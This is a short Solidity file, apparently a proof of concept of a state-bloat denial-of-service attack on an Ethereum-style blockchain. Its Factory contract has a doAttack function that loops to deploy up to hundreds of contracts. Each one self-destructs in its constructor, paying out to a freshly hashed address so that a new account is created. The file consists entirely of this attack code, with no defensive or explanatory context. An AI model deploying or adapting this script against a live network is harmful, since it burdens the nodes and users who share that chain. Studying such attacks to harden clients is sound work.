// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract MyContract {
    constructor(uint i) {
        //execute suicide/selfdestruct operation touching a new account
        address addr = address(bytes20(sha256(abi.encodePacked(i, msg.sender, block.timestamp))));
        selfdestruct(payable(addr));
    }
}

contract Factory {
    address[] newContracts;

    //solidity only allowed a maximum of 500 before out of gas error
    function doAttack(uint times) public {
        // create lots of smart contracts
        for (uint i = 0; i < times; i++) {
            MyContract newContract = new MyContract(i);
            address temp = address(newContract);
            newContracts.push(temp);
        }
    }

    function getTotal() public view returns(uint) {
        return newContracts.length;
    }
}
